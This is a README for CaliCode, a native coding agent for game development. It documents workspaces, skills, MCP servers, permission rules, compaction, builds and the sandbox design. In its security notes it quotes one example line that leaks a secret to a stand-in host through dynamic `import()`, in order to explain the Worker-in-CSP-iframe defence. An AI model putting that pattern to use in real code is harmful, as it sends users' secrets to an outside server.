# CaliCode

CaliCode is a native coding agent built for game development. The agent is the
main work surface; a dedicated game workspace adds live play, source editing,
assets, scene tools, runtime capture, and playtests beside the conversation.
A Rust control plane drives the editor through real tool calls.

No harness fork and no generated Three.js code — image-to-3D reconstruction is
a Rust pipeline that emits a data-driven `.cali` asset. The core is also an MCP
client: user-configured MCP servers can contribute tools to agent sessions (see
[Extending CaliCode](#extending-calicode)).

## Two ways to work

**Projects** are scene documents CaliCode owns end to end, stored under
`~/.cali/projects/<slug>`. The PLAY tab runs them in the PIE viewport.

**Workspaces** are folders on disk that CaliCode edits *in place* — your own
repository, unchanged. CaliCode browses the file tree, reads and writes real
files, and runs the project's own dev server in the PLAY tab.

**Each task owns its effective folder.** A workspace attached to a game is the
source/default. On the first turn of a task, CaliCode records an immutable
workspace binding and creates a dedicated Git worktree when possible. Switching
tasks switches the file tree and dev-server root. A non-Git folder is bound but
shared; use separate folders when concurrent tasks need isolated writes.

This task binding is what the agent's file tools follow: `file_read`,
`file_write`, and `file_list` resolve inside the active task's worktree, never
whichever project or editor happened to be selected most recently.

|                | Project              | Workspace                     |
| -------------- | -------------------- | ----------------------------- |
| Lives at       | `~/.cali/projects`   | anywhere                      |
| Owned by       | CaliCode             | you                           |
| Content        | scene JSON           | real source files             |
| PLAY renders   | the PIE viewport     | the workspace's own dev server |
| Attached to    | —                    | one task (game default before the first turn) |

## Asset library

The sidebar's **Assets** section is a curated registry of external repos —
VFX, shaders, models, tooling — the studio knows about. The library stores
metadata only (link, tags, license, a settings schema), never third-party
source. Attaching a repo to a game saves its id and chosen setting values in
the project document, where the agent can read them.

To add a repo, drop one file in `client/src/lib/assetLibrary/repos/` exporting
`repo: AssetRepo` — it is picked up automatically, no index edit needed. See
`linear-ability-casting.ts` for the shape.

## Extending CaliCode

Two extension points, both configured without touching CaliCode's source.

### Skills

A skill is a markdown file with YAML frontmatter — `name` (`[A-Za-z0-9_-]`,
≤48 chars) and a one-line `description` are required, the body is free-form
instructions:

```markdown
---
name: blockout-standards
description: How to build blockout geometry that passes review
---
Free-form markdown body with the actual instructions.
```

Global skills live in `~/.cali/skills/*.md` and apply to every game.
Per-project skills live in `<project>/.cali/skills/*.md` — inside the attached
workspace when the game has one (so they version with your repo), otherwise
under `~/.cali/projects/<slug>/.cali/skills`. A project skill shadows a global
skill of the same name.

Skills are progressive-disclosure: the system prompt carries only an index of
names and descriptions, and the agent pulls a full body with the `skill_load`
tool when one is relevant. Enable state lives in config (`skills.disabled`
holds `"<scope>:<name>"` keys), so toggling a skill from Settings never
rewrites your markdown.

### MCP servers

Add MCP servers under `mcp_servers` in `~/.cali/config.yaml`; their tools
join agent sessions namespaced as `mcp__<id>__<tool>`:

```yaml
mcp_servers:
  - id: blender            # [a-z0-9-], ≤24 chars; becomes the tool prefix
    transport: stdio       # stdio (default) or http
    command: uvx
    args: ["blender-mcp"]
    env:
      BLENDER_HOST: "127.0.0.1"
    enabled: true          # default true
    trust: false           # default false
    timeout_secs: 120      # per-call timeout, default 120
    tools:                 # optional per-server tool filter
      include: []          #   non-empty = allowlist (fnmatch globs)
      exclude: ["render_*"] # hidden unless include claims them first
  - id: issues             # http transport: url instead of command
    transport: http
    url: "http://127.0.0.1:9000/mcp"
```

Servers are spawned at core boot and on `mcp_reload`; invalid entries are
dropped with a warning rather than blocking startup. `enabled: false` keeps
the entry but spawns nothing. Spawned children get a scrubbed environment —
only the declared `env` plus a safe baseline, never `CALI_*` API keys.

**Per-project servers.** A game folder's `.cali/config.yaml` may carry its own
`mcp_servers:` list. Entries are merged over the global list by id when that
game is opened: a project entry with the same id overrides the global one
(`enabled: false` disables a global server for that project only), and new ids
add project-scoped servers. The MCP settings panel badges each server
global/project and shows its tool filter.

**Tool filters.** `tools: {include: [...], exclude: [...]}` narrows what the
agent sees, matched against the server's own tool names with fnmatch globs
(`*`, `?`, `[...]`). A non-empty `include` is an allowlist and wins on
conflict with `exclude`; with `include` empty, everything not matching
`exclude` is exposed.

MCP tools are treated as destructive by default: under `supervised` and
`auto-accept-edits` every call is approval-gated. Set `trust: true` on a
server you control to let its calls through ungated. `full-access` bypasses
gating as usual.

### Codex and Claude CLI editor control

The built-in agent and external MCP clients share the same live editor tool
surface. The bundled stdio adapter resolves the CLI's working directory to a
saved task and refuses to drive CaliCode when another task is open. See
[Session-scoped editor agents](docs/editor-agent-bridge.md) for the Codex CLI
and Claude Code setup commands.

### Permission rules

An optional `permissions:` list in `~/.cali/config.yaml` overrides the
per-session permission mode tool by tool. Rules are fnmatch globs over tool
names; the **last** matching rule wins:

```yaml
permissions:
  - { pattern: "file_*", action: allow }        # never ask
  - { pattern: "mcp__blender__*", action: ask } # always ask
  - { pattern: "file_write", action: deny }     # hidden from the model
```

`allow` skips the approval prompt regardless of mode, `ask` forces one, and
`deny` removes the tool from the agent's tool list entirely (denied calls are
also refused if the model hallucinates one). Tools no rule matches fall back
to the mode logic. Subagents inherit the parent's rules. The composer's
**Plan** mode is separate and stricter: it restricts dispatch to a read-only
whitelist, so planning turns cannot modify anything.

### Context compaction

Core tracks per-session token usage from provider `usage` reports (the meter
next to the composer; `/usage` prints totals) and compacts long sessions in
place: old oversized tool results are pruned, the middle of the transcript is
replaced with one structured summary (goal / progress / decisions / files /
next steps), and the replaced turns are soft-archived into the session file —
resuming shows them as a collapsed row. `/compact` triggers it on demand;
by default it also auto-triggers when the context crosses the threshold.
Tune it in `~/.cali/config.yaml`:

```yaml
compaction:
  auto: true           # auto-compact when the threshold is crossed
  threshold: 0.75      # fraction of the context window that triggers it
  reserved: 8192       # tokens held back for the reply + summary
  context_length: null # override the assumed context window (default 128000)
```

## Layout

- `core/` — Rust JSON-RPC service: model gateway, project store, workspaces,
  dev-server supervisor, checkpoints, assets, baselines, image-to-3D, agent loop.
- `client/` — Vite + React + TypeScript three.js editor.

## Run

```bash
./scripts/dev.sh
```

The Rust core listens on `http://127.0.0.1:8765`; Vite serves the editor on
`http://127.0.0.1:5199` and proxies `/rpc` and `/events` to core. Workspace dev
servers get a port in `5300–5399`.

Both ports are configurable, so two instances can run side by side. Set the
same values for core and the client, since core's CORS allowlist is built from
them:

```bash
CALI_PORT=8799 CALI_CLIENT_PORT=5299 ./scripts/dev.sh
```

## Desktop app

CaliCode also ships as a native macOS app (Tauri) — no browser, no visible
terminal. The window is a native shell around the same editor: it launches the
`cali-core` binary as a bundled sidecar and points one webview at core's own
origin, so `/rpc`, `/events`, and the built client are all same-origin.

```bash
cd client && pnpm desktop:build   # -> CaliCode.app + .dmg
pnpm desktop:install              # rebuild, update /Applications/CaliCode.app, reopen
pnpm desktop:dev                   # run the native shell against a live core
```

Bundles land in `client/src-tauri/target/release/bundle/` (`macos/CaliCode.app`
and `dmg/`). Use `desktop:install` after source changes when you want the copy in
Applications to update too. The packaged app pins core to port `8765`, so quit
any browser dev instance on that port before launching it.

## Tests

```bash
cd core && cargo test
cd client && pnpm test
cd client && pnpm test:e2e
```

The e2e suite needs core running. Three specs exercise a live model provider
and will fail without one configured.

## Security notes

The RPC surface is unauthenticated and loopback-only. CORS is restricted to the
dev-server and core origins; extend it with `CALI_ALLOWED_ORIGINS` if you serve
the client from somewhere else. Do not expose port 8765 beyond localhost.

Workspace file access is confined to the workspace root by a canonicalizing
resolver, refuses `.env` / key material, and never executes an arbitrary
command — `devserver_start` takes a script *name* that must already exist in
the target's `package.json`.

Project scripts run in a sandboxed Worker with `fetch`, `XMLHttpRequest`,
`WebSocket`, `postMessage` and friends deleted along the whole prototype
chain, so a script from an untrusted project cannot reach the RPC surface.

Isolation is two layers, because neither is sufficient alone. A Worker gives
thread isolation, so `while (true) {}` is contained and terminated — but a
Worker cannot carry a Content-Security-Policy, and dynamic `import()` is
syntax rather than a property, so no amount of global hardening refuses
`import("http://host/?" + secret)`. A CSP iframe refuses both `import()` and
every network call — but a same-process iframe shares the main thread, so an
infinite loop freezes the editor.

CaliCode runs the Worker *inside* a CSP-locked, opaque-origin iframe. The
worker inherits `connect-src 'none'` and a `script-src` that permits no URL
source, while keeping its own thread. Measured in a browser and asserted in
`e2e/sandbox.spec.ts`: a `fetch` to `/rpc` is refused, `import()` of it is
refused, and a spinning script is terminated in 2s without touching the UI.

Scripted tests run in their own sandboxed Worker. They genuinely need
main-thread capabilities — stepping PIE, comparing baselines through core — so
the worker calls back over a request/response channel rather than being handed
those objects; it never holds a reference to anything real. `entityFor` stays
synchronous, served from a scene snapshot refreshed on every host reply. A
test that exceeds its timeout has its worker terminated.

Workspaces you attach are recorded in `~/.cali/config.yaml` and re-opened at
startup. Only the path is stored, so a custom label is not preserved.
